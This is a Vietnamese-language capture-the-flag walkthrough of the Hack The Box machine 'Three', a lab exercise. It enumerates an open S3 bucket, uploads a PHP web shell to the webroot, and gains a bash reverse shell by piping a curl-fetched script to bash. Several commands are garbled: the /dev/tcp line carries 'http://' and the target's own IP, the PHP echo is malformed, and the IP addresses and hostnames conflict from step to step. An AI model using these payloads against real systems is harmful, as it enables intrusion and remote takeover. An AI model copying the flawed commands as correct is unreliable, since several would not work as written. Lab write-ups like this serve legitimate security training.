> Three là một máy ảo chạy Linux bao gồm một website, sử dụng AWS S3 bucket như thiết bị lưu trữ đám mây. Ta sẽ thực hành tấn công lỗ hổng dựa trên việc 
### 1. Kiểm tra thông tin mục tiêu
###### IP: 10.129.87.186
##### + Kiểm tra cổng và dịch vụ:
` nmap -p- --min-rate 1000 -sV 10.129.87.186
##### => 22/tcp ssh OpenSSH; dịch vụ cho phép kết nối từ xa.
##### => 80/tcp http Apache; web app
##### + Truy cập thử trang web:
` http://10.129.87.186 `
##### + Nghịch trang web một hồi thì thấy đa số chức năng hoạt động không đúng cách.
##### + Kiểm tra ngôn ngữ và công nghệ được sử dụng với Wappalyzer.
##### + Trong phần 'Contact' thì email : *toppers.htb*, chuyển địa chỉ IP của máy về tên miền tương ứng:
` echo "10.129.87.186 toppers.htb" | sudo tê -a /etc/hosts `
###### Đây là một bước cần thiết trong kiểm thử giúp tăng tính bảo mật và tránh rò rỉ hoạt động ra bên ngoài.
##### + Sau khi thay đổi, ta có thể truy cập website với địa chỉ http://thetoppers.htb.
##### + Brute force các tên miền phụ của trang web với wfuzz:
###### Subdomain là một phần mở rộng của tên miền đã đăng ký. Phục vụ việc chia sẻ và sắp xếp thông tin cho một chức năng cụ thể: ví dụ như blog hoặc cửa hàng online: từ website của trang chủ.
` wfuzz -c -z file,subdomains-top1million-5000.txt -H "Host: FUZZ.thetoppers.htb" http://thetoppers.htb `
###### -c: đẩy kết quả có màu khác nhau.
###### -z: file được dùng để bruteforce.
###### -H: FUZZ sẽ được thay thế bằng các từ trong danh sách từ sử dụng cho bruteforce
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/f21d8734-9f4f-4a40-8fe7-65fa1e0cd02a)
##### => có *s3* với mã khác là *404*
##### + Thêm tiền miền phụ s3 và */etc/host* :
`echo ’10.129.178.223 s3.thetoppers.htb’ | sudo tee -a /etc/hosts`
##### + Load đường link: 
```
URL:
http://s3.thetoppers.htb
Web (JSON format):
{"status:"running"}
```
###### S3 là một service lưu trữ đối tượng dựa trên đám mây. Cho phép lưu trữ trong một container gọi là buckets. AWS S3 Buckets có nhiều ứng dụng như lưu trữ, back up, media hosting, software delivery, website tĩnh.... Các file được store trong Amazon S3 bucket được gọi là *S3 objects*.
##### + Tương tấc với S3 thông qua *awscli*:
```
$  aws configure
AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp
```
###### ở đây ‘temp’ là giá trị ngẫu nhiên cho yêu cầu của trường để kiêm thử trong trường hợp máy chủ được cấu hình để không kiểu tra xác thức (tuy nhiên phải được cấu hình thành thứ gì đó để aws hoạt động).
##### + Liệt kê tất cả các S3 Buckets hosted bởi server:
``` 
aws --endpoint=http://s3.thetoppers.htb s3 ls
2023-12-24 13:49:49 thetoppers.htb
```
##### + Sử dụng lệnh `ls` để liệt kê các Objects và các prefixes phổ biến dưới một bucket cụ thể:
```
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                            PRE  images/
2023-12-14 13:49:49           0  .htaccess
2023-12-14 13:49:50       11952  index.php
```
##### => file *index.php*, *.htaccess* và một thư mục tên *Images* trong bucket. Vì webroot (đường dẫn gốc) của website chạy trên apache cổng 80 (mặc định), nên có thể hiểu rằng Apache server đang sử dụng S3 Bucket như một kho chứa.
### 2. Tấn công lỗ hổng
##### + awscli còn cho phép copy files đến một bucket từ xa. Biết rằng website đang sử dụng PHP. Thêm nữa, chúng ta có thể thử upload một file shell PHP đến s3 bucket và vì nó được upload thẳng lên webroot, nếu truy cập web này bằng trình duyệt, sẽ thi hành file và sẽ chiếm được quyền thi hành code từ xa.
##### + Quy trình tấn công: 
```
Attacker: upload file shell lên web nhằm tạo lỗ hổng Command Injection Attack.
Attacker: thực thi reverse shell, sử dụng netcat để lắng nghe.
Target: : kết nối đến netcat.
Attacker: Chiếm quyền thành công, tiến hành khai thác thông tin.
```
##### + Đầu tiên, tạo file để giúp thao túng website:
` echo '< ?php system($_GET["cmd"]); ?> `

##### + Đẩy file lên web:
```
$ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
upload: ./shell.php to s3://thetoppers.htb/shell.php
```
##### + Kiểm tra file shell.php đã được upload thành công chưa:
```
http://thetoppers.htb/shell.php?cmd=id 
```
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/86e39306-84c7-4b62-806f-723294956e26)
##### + Có quyền thực thi code với bucket.
##### + Tiến hành các bước set up reverse shell:
```
1. Kiểm địa chỉ IP của attacker và target: ifconfig => tun0 10.10.14.89
2. Tạo reverse shell tên shell.sh với payload:
      #!/bin/bash
      bash -i >& /dev/tcp/http://10.129.87.186/1337 0>&1
=> target sẽ kết nối máy attacker qua cổng 1337
3. Bật netcat để lắng nghe cổng:
      nc -nvlp 1337
4. Khởi tạo một web server và host bash file này
      python3 -m http.server 8000
      Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
*** bước 3 & 4 ở 2 tab terminal khác nhau.
```
##### + Sau khi set up xong, tiến hành đẩy file bash lên trang web: 
`http://thetoppers.htb/shell.php?cmd=curl%2010.10.14.89:8000/shell.sh|bash`
##### + Quay về terminal lúc bật netcat:
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/df1d2018-3228-459c-aad2-2cfc43012fcc)
##### => Reverse shell thành công!
### 3. Truy tìm sau thâm nhập:
##### + Tìm flag trong /var/www/flag.txt
` www-data@three:/var/www$ cat flag.txt `
